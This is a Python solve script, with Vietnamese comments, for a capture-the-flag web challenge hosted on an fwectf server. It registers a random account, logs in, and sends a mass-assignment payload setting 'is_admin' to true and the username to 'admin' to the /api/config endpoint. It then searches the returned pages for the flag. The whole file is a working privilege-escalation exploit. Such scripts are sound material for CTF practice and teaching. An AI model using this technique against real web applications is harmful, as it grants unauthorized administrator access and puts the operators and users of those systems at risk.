import requests, re, secrets

BASE = "http://e6ced45578b740ddb38b30194bc8bb060.chal2.fwectf.com:8006"

# tạo user ngẫu nhiên để tránh trùng
u = "u" + secrets.token_hex(4)
p = "p" + secrets.token_hex(4)

s = requests.Session()

def grep_flag(text):
    m = re.search(r"fwectf\{.*?\}", text, re.S | re.I)
    return m.group(0) if m else None

# 1) register (bỏ qua nếu trùng)
s.post(f"{BASE}/register", data={"username": u, "password": p})

# 2) login
r = s.post(f"{BASE}/login", data={"username": u, "password": p})
assert r.status_code == 200, "Login failed"

# 3) elevate quyền qua mass assignment
payload = {"username":"admin","is_admin":True,"config":{"mode":"admin"}}
r = s.post(f"{BASE}/api/config", json=payload)
print("[*] elevate:", r.text)

# 4) GET / và grep flag
r = s.get(f"{BASE}/")
flag = grep_flag(r.text)
if flag:
    print("FLAG:", flag)
else:
    print("[!] Chưa thấy flag trong /. In preview để tự xem:\n")
    print(r.text)

# Thử thêm /config (phòng khi flag render ở đây)
r = s.get(f"{BASE}/config")
flag2 = grep_flag(r.text)
if flag2:
    print("FLAG (from /config):", flag2)
